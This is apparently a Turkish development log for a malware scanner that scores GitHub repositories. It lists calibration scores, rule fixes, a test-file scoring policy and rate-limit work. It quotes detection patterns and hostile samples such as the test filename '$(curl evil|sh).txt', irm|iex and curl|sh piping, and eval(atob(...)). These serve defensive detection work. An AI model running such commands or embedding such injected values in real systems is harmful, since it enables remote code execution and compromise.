| `anthropics/claude-code` | Tehlikeli 85 | Tehlikeli 70 | GR-CODE-002 +35, GR-LINK-001 +20, GR-OBF-002 +15 |
| `sindresorhus/awesome` | Temiz 0 | Temiz 0 | - |
| `tldr-pages/tldr` | Tehlikeli 88 | Temiz 8 | GR-CODE-007 +5, GR-CODE-004 +3 |
| `pallets/flask` | Temiz 0 | Temiz 0 | - |
| `django/django` | Tehlikeli 100 | Temiz 20 | GR-LINK-001 +20 |
| `psf/requests` | Temiz 0 | Temiz 0 | - |
| `pypa/pip` | Tehlikeli 90 | Şüpheli 40 | GR-BIN-001 +20, GR-LINK-001 +20 |
| `NVIDIA/apex` | Temiz 10 | Temiz 10 | GR-AUTO-002 +10 |
| `pycurl/pycurl` | Şüpheli 35 | Temiz 10 | GR-AUTO-002 +10 |
| `python-poetry/poetry` | Şüpheli 30 | Temiz 15 | GR-AUTO-002 +10, GR-BIN-001 +5 |
| `astral-sh/uv` | Tehlikeli 100 | Şüpheli 55 | GR-BIN-001 +20, GR-LINK-001 +20, GR-AUTO-005 +5, GR-CI-001 +5, GR-CODE-002 +5 |
| `rust-lang/rustup` | Tehlikeli 80 | Tehlikeli 80 | GR-CODE-002 +35, GR-SOC-001 +25, GR-LINK-001 +20 |
| `BurntSushi/ripgrep` | Temiz 25 | Temiz 25 | GR-LINK-001 +20, GR-AUTO-005 +5 |
| `microsoft/terminal` | Şüpheli 65 | Şüpheli 35 | GR-BIN-001 +20, GR-AUTO-004 +10, GR-CODE-007 +5 |
| `notepad-plus-plus/notepad-plus-plus` | Tehlikeli 100 | Şüpheli 35 | GR-BIN-001 +20, GR-AUTO-004 +10, GR-CODE-007 +5 |
| `PowerShell/PowerShell` | Tehlikeli 100 | Tehlikeli 95 | GR-CODE-002 +35, GR-CODE-004 +25, GR-LINK-001 +20, GR-CODE-003 +10, GR-BIN-001 +5 |
| `cli/cli` | Tehlikeli 100 | Şüpheli 35 | GR-BIN-001 +20, GR-CODE-004 +15 |
| `junegunn/fzf` | Temiz 0 | Temiz 0 | - |
| `public-apis/public-apis` | Şüpheli 55 | Temiz 0 | - |
| `EbookFoundation/free-programming-books` | Şüpheli 55 | Temiz 20 | GR-LINK-001 +20 |
| `microsoft/vscode` | Tehlikeli 100 | Tehlikeli 100 | GR-AUTO-003 +35, GR-CODE-002 +35, GR-CODE-007 +35, GR-CODE-004 +25, GR-BIN-001 +20, GR-OBF-001 +15, GR-AUTO-001 +10, GR-AUTO-008 +10, GR-CI-001 +5, GR-CODE-003 +5 |

**Bulunan hatalar ve yapılan düzeltmeler** (her biri için pozitif ve negatif fixture var):

- **Link kuralları (`GR-LINK-*`):**
  - `.com` "çalıştırılabilir uzantı" sayılıyordu. `github.com/expressjs/expressjs.com` gibi her link indirme sanılıyordu; `.com` listeden çıkarıldı.
  - Belgelerdeki örnek adresler (`example.com`, `*.test`, `localhost`) yok sayılıyor. Kendi fixture'larımızdaki `.invalid` adresler kapsamda kaldı.
  - Reponun kendi `releases/latest/download/` linkleri de muaf oldu (digest kontrolü bunları da kapsıyor).
  - npm, PyPI, crates, NuGet, RubyGems paket sayfaları ve Wikipedia makaleleri indirme sayılmıyor (`npmjs.com/package/lodash.zip` gibi).
  - Link kısaltıcı (`GR-LINK-002`) artık yalnızca tek parçalı kısa linkte ve satırda indirme bağlamı varsa sayılıyor. Bağlam: download, install, setup, mirror, exe, zip, "click here" vb. Anket ve makale linkleri sayılmıyor. Reklamlı indirme kapıları (linkvertise vb.) her zaman sayılıyor.
  - Dosya paylaşım sitesi (`GR-LINK-003`) artık yalnızca bir dosyaya işaret eden linkte sayılıyor: kimlik, alt yol, sorgu ya da `#anahtar` içermeli. `dropbox.com/developers`, `gofile.io/api`, ana sayfalar ve `{{https://mega.nz/...}}` gibi şablonlar sayılmıyor. PDF/EPUB/görsel linkleri de sayılmıyor.
  - Arşiv şifresi (`GR-LINK-004`) tamamen yeniden yazıldı. Eskiden dosyanın herhangi bir yerinde "zip" geçiyorsa her `password:` ve `pass:` sayılıyordu; "following pass:", tldr'nin "contraseña:" cümleleri ve README'deki kod örnekleri de buna dahildi. Artık "Password: 1234", "**Password:** `2026`", "The archive password is ..." gibi satır başındaki bir etiket ve gerçek bir değer aranıyor. Arşivden de en fazla 10 satır uzakta olmalı.
- **Antivirüs (`GR-SOC-001`):**
  - "add the exclusion" artık aynı satırda antivirüs/Defender geçmiyorsa sayılmıyor (cli/cli'de bir linter notuydu). "Add the folder to exclusions" kalıbı ise sayılmaya devam ediyor.
  - CHANGELOG/HISTORY/NEWS gibi sürüm notları taranmıyor: "daha az antivirüs yanlış alarmı" bir talimat değil.
- **`curl | sh` (`GR-CODE-002`):**
  - Yorum satırları atlanıyor: ohmyzsh ve PowerShell kurulum scriptlerinin başındaki "Usage: sh -c "$(curl ...)"" satırları.
  - İndirileni komut satırında yazılmış bir programa veri olarak veren satırlar (`curl ... | perl -ne '...'`, `| python -c '...'`) sayılmıyor. O program `eval`/`exec` içeriyorsa sayılıyor.
  - Dockerfile içindeki `RUN curl | sh` konteynerin içinde çalışıyor, 5 puan alıyor.
  - CI ayarları artık yalnızca GitHub Actions değil: GitLab CI, Azure Pipelines, CircleCI, Travis, Jenkinsfile vb. de `GR-CI-001`'e (5 puan) gidiyor.
  - Yeni kalıp: `iex "& { $(irm https://...) }"`.
- **Tarayıcı şifreleri (`GR-CODE-003`):** Windows DPAPI (`CryptUnprotectData`) tek başına 10 puan alıyor. Aynı dosyada tarayıcı şifre dosyaları da varsa 40 alıyor. PowerShell'in SecureString kodu tarayıcıya dokunmuyordu.
- **SSH anahtarları (`GR-CODE-004`):**
  - Anahtar yolu tek başına 15 puan alıyor. SSH araçları da anahtar okur: VS Code'un SSH bağlantısı, `gh ssh-key`.
  - Aynı dosyada veri gönderme varsa 25 alıyor (`fetch`, `requests.post`, `Invoke-WebRequest`, `curl`, `nc host port`, webhook).
  - `authorized_keys` her zaman 25 alıyor, çünkü oraya anahtar eklemek tek başına bir arka kapı.
- **Çözüp çalıştırma (`GR-CODE-001`):** `eval(unescape(değişken))` 10 puan alıyor; eski kodda çerez ayrıştırmak için kullanılıyordu (lodash'taki firebug-lite). `eval(unescape("%..."))` gibi kodlanmış bir sabit ve `eval(atob(...))` 45 almaya devam ediyor.
- **Windows araçları (`GR-CODE-007`):** Inno Setup/WiX/NSIS kurulum scriptlerinde (`.iss`, `.wxs`, `.nsi`) Run anahtarı ve gizli PowerShell 5 puan alıyor. Kurulum programlarının işi bu ve bu dosyalar klonlayınca çalışmıyor.
- **Gizleme (`GR-OBF-*`):**
  - `GR-OBF-001`: Base64 çözülüp ilk baytlarına bakılıyor. PNG/JPEG/GIF/WebP, font (TTF/WOFF), PDF, WebM/MP4, sertifika (DER), JSON, PEM, SVG ve .NET güçlü ad anahtarları ("RSA1") zararsız sayılıyor; çalıştırılabilir dosyalar ve sıkıştırılmış veri sayılmıyor.
  - Ayrıca `ABCDEF0123...` gibi kendini tekrar eden dizgeler, `data:application/json` (source map) ve `data:video/...` adresleri, markdown link hedefleri (`](/playground#H4sI...)`) ve `anahtar=değer` biçimindeki JWT/çerez değerleri de zararsız sayılıyor. `.svg`, `.drawio` ve `.pdf` taranmıyor.
  - Çok uzun satırlar pencereler halinde taranıyor; bir pencere başka bir dizgenin ortasında başlarsa o dizge artık ikinci kez ve yanlış hizada çözülmüyor.
  - `GR-OBF-002`: Yalnızca metnin yönünü açan karakterler (U+202A/B/D/E, U+2066–2068) sayılıyor; tek başına kapatıcılar (U+202C, U+2069) sayılmıyor (notepad++ Kürtçe dil adı). Küçültülmüş (`*.min.js`) dosyalar atlanıyor, çünkü onları okuyan bir insan yok ki kandırılsın. Ağırlık 30'dan 15'e indi: bu bir kod inceleme saldırısı; repo zararlılarında neredeyse görülmüyor, güvenlik araçlarının testlerinde ise sık geçiyor (svelte, claude-code).
  - `GR-OBF-003`: Boşluklar bir dizgenin içindeyse ve dizge kapandıktan sonra kod yoksa sayılmıyor. VS Code'un terminal kayıtları bu yüzden yakalanıyordu.
  - `GR-OBF-004`: Hangul dolgu karakteri yalnızca tek başına bir değişken adı gibi duruyorsa sayılıyor; Unicode aralık tablolarında (django'daki xregexp) sayılmıyor.
- **Otomatik çalışanlar (`GR-AUTO-*`):**
  - Taban puanlar düşürüldü. `package.json` scripti, Visual Studio build olayı ve dev container komutu 10 puan, yapay zekâ hook'u 15 puan alıyor. Projenin kendi dosyasını çalıştırmak normal; o dosya diğer kurallarla zaten taranıyor. İndirme/çözme içeren komutlar eskisi gibi 35–40 alıyor.
  - Yalnızca git hook kuran ya da paket yöneticisi seçtiren bilinen komutlar raporlanmıyor: `husky`, `simple-git-hooks`, `npx only-allow pnpm`, `lefthook install`. Bu, tam eşleşme gerektiriyor; yanlarına bir şey eklenirse yine sayılıyor.
  - `node -e`/`python -c` artık yalnızca içindeki kod süreç, ağ ya da çözme kullanıyorsa riskli sayılıyor. Electron'un `node -e 'process.exit(0)'` komutu 35 alıyordu.
  - Visual Studio build olayında yerel bir `.ps1` dosyasını çalıştıran PowerShell artık 10 puan. İndirme, `-w hidden`, `-enc`, `iex` ya da rundll32/regsvr32/mshta gibi LOLBin'ler 40 almaya devam ediyor; 2021'deki Lazarus saldırısının biçimi için bir fixture var.
  - `setup.py`'deki dosya düzeyi kontrol, indirme aracını yalnızca bir komut olarak geçiyorsa sayıyor (`["curl", ...]`, `"curl -fsSL ..."`). "Curl directory does not exist" gibi mesajlar sayılmıyor; pycurl 10 puanla Temiz.
- **İkili dosyalar (`GR-BIN-001`):** Python wheel ve NuGet paketlerinin içindeki DLL/EXE 5 puan alıyor. Bunlar paket yöneticisi içindir, kimse içlerine çift tıklamaz. Tek başına duran `.exe`/`.dll` eskisi gibi 20 alıyor.

**Tespit gücü düşmedi mi?** `tests/calibration.test.ts` iki yönü de kilitliyor:
- Şu zararlı biçimler hâlâ yakalanıyor: sahte iş mülakatı reposu, `postinstall` + `curl | sh`, VS Code `folderOpen` görevi, Visual Studio'da gizli PowerShell, tarayıcı + cüzdan + webhook çalan dosya, anahtarı okuyup gönderen dosya, `setup.py` indirmesi, "antivirüsü kapat ve irm | iex çalıştır" README'si.
- Bu turda yanlış alarm veren meşru kalıplar ise sessiz kalıyor.
- Bir düzeltmeyi bu yüzden geri aldım: README'deki `irm ...ps1 | iex` satırını kurulum komutu sayıp muaf tutmak, "antivirüsü kapat, şunu çalıştır" tuzağını Temiz'e düşürüyordu.

**Kalan 10 repo neden hâlâ Şüpheli/Tehlikeli** (hepsi gerçekten o kalıbı içeriyor; kural hatası değil):
- **Güvenlik testleri:** claude-code ve electron, kendi güvenlik özelliklerinin testlerinde bu kalıpları bilerek kullanıyor:
  - claude-code: testte `'$(curl evil|sh).txt'` dosya adı ve U+202E karakteri
  - electron: test için commit'lenmiş bir `.lnk` dosyası
  - PowerShell: testlerde SSH anahtarı üretip `authorized_keys`'e yazan yardımcı
  - VS Code: SSH testleri
- **Kurulum aracı olan projeler:** rustup ve PowerShell'in işi `curl | sh` ve `irm | iex` ile kurulum yapmak. rustup'ın SSS'sinde "Disable antivirus scanner and try again" cümlesi gerçekten var.
- **Commit'lenmiş programlar:** pip (Windows başlatıcıları), uv (trampolinler), terminal (nuget.exe, WinAppDriver), notepad++ (test DLL'leri), cli/cli (test zip'indeki gh.exe).
- **VS Code gerçekten bu kodları içeriyor:** Copilot'un `curl | bash` ile kurulum yapan kodu, `folderOpen` görevi, gizli PowerShell çalıştıran kurulum scripti, SSH anahtarı okuyan uzak bağlantı kodu.

**Kullanıcıya sorulan iki karar** (8. oturumda kullanıcı "ne öneriyorsan" dedi; uygulananlar 8. oturumda):
1. **Test dosyaları.**
   - Bulgular `test/`, `tests/`, `spec/`, `__tests__/`, `fixtures/` altındaysa raporda ayrı bir "test dosyalarında" grubunda gösterilebilir.
   - Puanı düşürmek ise CLAUDE.md'deki "klasöre göre puan düşürülmez" kararıyla çelişir: saldırgan payload'ı `tests/` içine saklayabilir.
   - Orta yol: yalnızca gösterimi ayırmak, ya da test klasöründeki bulguların tek başına Tehlikeli yapamaması (en fazla Şüpheli).
2. **Repo itibarı.**
   - Çok yıldızlı, yıllardır aktif ve köklü bir hesaba ait repolarda karar en fazla Şüpheli olabilir. Bunun istisnası GR-DEP-001 gibi kesin göstergeler.
   - Riski: yıldızlar satın alınabiliyor, eski hesaplar ele geçirilebiliyor. Ele geçirilmiş popüler bir repoya eklenen zararlı kod "Tehlikeli" yerine "Şüpheli" görünür.

### 9 Ekim 2026 (8. oturum): Progress sayfası kaldırıldı, test dosyası kararı

**İstek:** "Ne öneriyorsan ona devam et; sitedeki progress kısmını sil, o bana özel."

**Progress sayfası:**
- `/progress` sayfası, menüdeki linki, ona ait CSS ve yalnızca onun kullandığı `react-markdown`/`remark-gfm` paketleri silindi. README'deki `PROGRESS.md` linki de kaldırıldı.
- `PROGRESS.md` repoda duruyor; Claude oturumları onu okuyarak başlıyor.
- Dikkat: GitHub reposu public, bu yüzden dosya GitHub'da hâlâ okunabilir. Tamamen gizlemek için repo private yapılabilir (Vercel private repolarla da çalışır) ya da dosya repodan çıkarılabilir (o zaman oturumlar ilerlemeyi göremez).

**Test dosyası kararı** (7. oturumdaki 1. soru; kullanıcı önerileni seçti):
- Test kodu ve test verisindeki bulgular (`tests/`, `spec/`, `fixtures/`, `*.test.ts`, `test_*.py`...) raporda "in a test file" etiketiyle gösteriliyor ve puana tam ağırlıkla giriyor.
- Yalnızca bunlar yüzünden Tehlikeli olacak bir repo Şüpheli'de (69) tutuluyor ve raporda nedeni yazıyor. Şartlar:
  - test dışı bulguların toplamı 70'in altında,
  - test dışında kendiliğinden çalışan hiçbir şey (`postinstall`, `folderOpen`, build olayı...) yok.
- Kendiliğinden çalışan bir şey varsa sınır uygulanmıyor: `postinstall: node tests/setup.js` + `tests/setup.js` içinde `eval(atob(...))` Tehlikeli kalıyor (`tests/calibration.test.ts`).
- Etkisi: anthropics/claude-code 70 → 69 ve PowerShell 95 → 69, ikisi de Şüpheli. electron, rustup ve vscode Tehlikeli kalıyor; onların puanı test dışındaki koddan geliyor. Kalibrasyon: 28 Temiz, 7 Şüpheli, 3 Tehlikeli.

**Repo itibarı kararı** (2. soru): uygulanmadı. Yıldız ve yaş puanı düşürmüyor, raporda yalnızca bilgi olarak duruyor. Sebep: yıldızlar satın alınabiliyor, ele geçirilmiş popüler repolar gerçek bir tehdit.

`ENGINE_VERSION` 0.4.0 oldu; kayıtlı raporlar yeniden taranacak.

**Kalıcı hız sınırı ve tarama bütçesi** (kötüye kullanıma karşı; yeni servis yok, aynı Neon veritabanı):
- Eski sorun: hız sınırı yalnızca her Vercel örneğinin belleğindeydi. Vercel aynı anda birçok örnek açabildiği için biri sınırı kolayca aşıp GitHub token'ının saatlik 5.000 isteğini bitirebilirdi. O zaman site herkes için bozulurdu.
- Şimdi sayaçlar veritabanında, `rate_limits` tablosunda. İstemci başına dakikada 6 yeni tarama var ve tüm örnekler aynı sayacı görüyor.
- Ayrıca site geneli bir **saatlik bütçe** var: 500 yeni tarama. Dolunca yeni taramalar kibar bir hata alıyor ("budget_exhausted"), son 1 saatte taranmış repolar ise gelmeye devam ediyor. Sınırı aşan biri bu bütçeyi tüketemiyor.
- Gizlilik: veritabanına IP yazılmıyor, yalnızca geri çevrilemeyen bir özeti (HMAC) yazılıyor. Bir günden eski satırlar siliniyor.
- Veritabanı hata verirse tarama engellenmiyor, bellekteki sınır yine çalışıyor.
- Kalan risk: çok sayıda IP'den gelen bir saldırı saatlik bütçeyi bitirebilir; o zaman yeni taramalar bir saatliğine durur ama token korunur. Kesin çözüm Cloudflare Turnstile (insan doğrulaması). Ücretsiz ama yeni bir dış servis, kullanıcıya sorulacak.

**Git submodule'leri:**
- Kök dizindeki `.gitmodules` dosyası okunuyor. GitHub'ın indirme arşivi submodule'leri içermiyor, ama `git clone --recursive` onları başka repolardan indiriyor. Bu, payload saklamanın bir yolu.
- Raporda "N git submodules are not scanned" uyarısı ve liste var. GitHub'daki submodule'lerin yanında kendi sitemizde onu tarayan bir "scan owner/repo" linki çıkıyor. URL'nin kendisi tıklanamıyor ve `hxxps://` biçiminde gösteriliyor.
- Puanı etkilemiyor: submodule kullanan meşru repo çok. `ENGINE_VERSION` 0.5.0.

## Sıradaki adımlar (öncelik sırasıyla)

1. **Canlıda kontrol:** `/progress` sayfası kalkmış olmalı. Vercel'de Neon bağlıysa `rate_limits` tablosu ilk taramada kendiliğinden oluşur.
2. **Kalibrasyonun 2. turu:** daha fazla repo (Go, Java, PHP, mobil), özellikle commit'lenmiş programlar (`GR-BIN-001`) için bir ayar.
3. **Canlıda doğrulama:** Vercel'de bir repo taranınca raporda "Malicious dependencies (OSV)" satırı görünmeli. Yeni motor sürümüyle (şu an 0.5.0) Scammer listesindeki eski kayıtlar yeniden taranınca çoğu listeden çıkmalı.
4. **Liste kalitesi.** Scammer listesi herkese açık; kalan yanlış alarmlar orada görünür. Test dosyası ve itibar kararından sonra gerekirse listeye girme eşiği yükseltilebilir.
5. **Cloudflare Turnstile** (kullanıcıya sorulacak; kalıcı hız sınırı ve saatlik bütçe 8. oturumda yapıldı).
6. **Diğer arşiv biçimleri** (`.rar`, `.7z`, `.tar.gz`, `.jar`) şu an açılmıyor.
7. **VirusTotal API** (kullanıcıya sorulacak; anahtar gerekiyor): release digest'lerini otomatik sorgulama (günde 500 istek; kota dolarsa "atlandı").
8. **Tasarım** (kullanıcının isteği, en son): koyu tema yerine daha açık ve okunaklı bir arayüz.

## Bilinen sınırlamalar ve kalibrasyon notları

- Statik ve kalıp tabanlı: bilinmeyen ya da iyi gizlenmiş zararlı kod kaçabilir. Temiz sonuç garanti değildir; arayüz bunu her yerde söylüyor.
- `GR-AUTO-002` (`setup.py`) şu an satır ve dosya düzeyinde regex kullanıyor. Eski Python sürümündeki `ast` tabanlı veri akışı analizi (`replace`, `swapcase`, `chr`, ters çevirme ile gizlenmiş komutları yakalıyordu) taşınmadı. Gizlenmiş bir indirme komutu şu an 10 puan alabilir. Gerekirse Aşama 3'te TypeScript'e uyarlanabilir (eski kod: `git show a59f432:src/gitray/engine/pyflow.py`).
- `GR-AUTO-002`: `exec(open('pkg/version.py').read())` ile sürüm okuyan meşru `setup.py` dosyaları `GR-CODE-008` altında 10 puan alır (tek başına Temiz).
- `GR-AUTO-005`: Önceden derlenmiş kütüphane indiren meşru `-sys` crate'leri (`build.rs` içinde ağ kullanımı) 35 puanla Şüpheli çıkabilir. Kalibrasyondaki Rust repoları (uv, ripgrep, rustup) yalnızca `git` çalıştırıyor ve 5 puan aldı.
- `GR-OBF-001`: Bilinen biçimler (görsel, font, sertifika, JSON...) artık çözülüp eleniyor. Yine de rastgele test vektörleri, emscripten bellek verisi ve Yarn'ın `.yarn/releases/*.cjs` dosyasındaki sıkıştırılmış kod 15 puan alır. Yarn dosyası özellikle tartışmalı: `yarn` komutu bu dosyayı çalıştırdığı için gerçekten bir saldırı yolu olabilir.
- Kod kalıbı kuralları bir dizgenin test verisi mi yoksa çalışan kod mu olduğunu bilemez (`'$(curl evil|sh).txt'` gibi test adları). Bu yüzden test klasörlerindeki bulgular etiketleniyor ve tek başlarına Tehlikeli yapamıyor (8. oturum); puan düşürülmüyor.
- README'deki kurulum satırları (`curl | sh`) puan almaz; aynı satırın PowerShell hali (`irm ...ps1 | iex`) `.ps1` linki olduğu için `GR-LINK-001` ile 20 alır. Bu bilerek bırakıldı: "antivirüsü kapat, şunu çalıştır" tuzaklarının sinyali.
- `GR-LINK-001`: Kendi web sitesinden `.exe`/`.dmg` dağıtan meşru projeler 20 puan alır (tek başına Temiz).
- Şifreli RAR yalnızca başlıkları da şifreliyse (`rar -hp`) tespit edilir; 7z şifrelemesi tespit edilmiyor.
- İkili dosyalarda yalnızca ilk 1 MB okunur; ZIP içindeki dosya adları yalnızca bu kısımdaki yerel başlıklardan okunur.
- Hız sınırı veritabanı varsa tüm örnekler arasında ortaktır (8. oturum); veritabanı yoksa örnek başınadır. Çok IP'li bir saldırı saatlik bütçeyi bitirebilir (Turnstile ile çözülür). Önbellek veritabanında da var (1 saat).
- Listeler yalnızca son 50 kaydı gösterir; sayfalama ve arama yok.
- Proxy kısıtı yüzünden bu ortamda sahip hesap yaşı (`/users/...`) okunamıyor; raporda "unknown" görünüyor. Vercel'de çalışır.
